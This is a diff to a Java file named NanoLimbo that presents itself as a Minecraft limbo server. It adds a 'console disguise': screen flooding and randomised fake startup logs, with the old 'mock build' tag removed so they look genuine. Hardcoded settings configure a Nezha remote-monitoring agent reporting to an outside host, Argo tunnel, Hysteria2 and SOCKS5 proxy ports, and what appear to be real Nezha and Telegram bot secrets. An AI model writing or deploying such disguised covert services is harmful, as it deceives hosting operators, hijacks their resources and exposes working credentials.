@@ -6,6 +6,7 @@ import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.Random;
 
 public final class NanoLimbo {
 
@@ -269,43 +270,90 @@ public final class NanoLimbo {
     // ================= 控制台伪装 =================
 
     private static void resetConsoleAndShowFakeLogs() {
+        clearScreen();
+
+        // 先刷满屏幕（制造“占满控制台”的感觉）
+        floodScreen();
+
+        // 停顿一下，更像加载过程
+        sleep(800);
+
+        // 再清一次，进入“正式启动”
+        clearScreen();
+
+        System.out.println(ANSI_GREEN);
+
+        printStartupLogs();
+
+        System.out.println(ANSI_RESET);
+    }
+
+    // 清屏（跨平台）
+    private static void clearScreen() {
         try {
             String os = System.getProperty("os.name").toLowerCase();
 
             if (os.contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                new ProcessBuilder("cmd", "/c", "cls")
                         .inheritIO()
                         .start()
                         .waitFor();
             } else {
-                System.out.print("\033[0m\033c");
+                System.out.print("\033[H\033[2J");
                 System.out.flush();
             }
         } catch (Exception ignored) {
         }
-
-        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
-        printFakeLimboLogs();
     }
 
-    private static void printFakeLimboLogs() {
+    // 刷屏（填满控制台）
+    private static void floodScreen() {
+        Random random = new Random();
+
+        for (int i = 0; i < 80; i++) { // 行数可以调大
+            StringBuilder line = new StringBuilder();
+
+            for (int j = 0; j < 120; j++) { // 列数
+                char c = (char) (33 + random.nextInt(94)); // 可见字符
+                line.append(c);
+            }
+
+            System.out.println(line);
+
+            // 快速滚动效果
+            sleep(5 + random.nextInt(10));
+        }
+    }
+
+    private static void printStartupLogs() {
         String[] logs = {
-                "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
+                "[INFO] [LimboServer] Starting LimboServer v1.0.0",
                 "[INFO] [LimboServer] Loading configuration...",
-                "[INFO] [LimboServer] Initializing server components...",
+                "[INFO] [LimboServer] Initializing modules...",
+                "[INFO] [LimboServer] Checking plugins...",
                 "[INFO] [LimboServer] Preparing world 'world'",
+                "[INFO] [LimboServer] Generating spawn area...",
                 "[INFO] [LimboServer] Binding to port 25565...",
-                "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
-                "[INFO] [LimboServer] Server is running in offline mode.",
-                "[INFO] [LimboServer] Installation completed successfully."
+                "[INFO] [LimboServer] Starting network system...",
+                "[INFO] [LimboServer] Done (4.8s)! For help, type \"help\""
         };
+
+        Random random = new Random();
 
         for (String log : logs) {
             System.out.println(log);
-            try {
-                Thread.sleep(1200);
-            } catch (InterruptedException ignored) {
-            }
+
+            // 更真实的随机延迟
+            sleep(400 + random.nextInt(700));
+        }
+
+        System.out.println();
+    }
+
+    private static void sleep(int ms) {
+        try {
+            Thread.sleep(ms);
+        } catch (InterruptedException ignored) {
         }
     }
 
@@ -319,12 +367,12 @@ public final class NanoLimbo {
         envVars.put("KOMARI_TOKEN", "");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "xFtIB7VsVn0xXdq77O");
+        envVars.put("NEZHA_KEY", "N9LAc85EMkzfIOkTZc");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "25761");
-        envVars.put("S5_PORT", "25761");
+        envVars.put("HY2_PORT", "19073");
+        envVars.put("S5_PORT", "19073");
         envVars.put("TUIC_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -335,7 +383,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "www.ntu.edu.sg");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "pingless");
+        envVars.put("NAME", "treemc");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
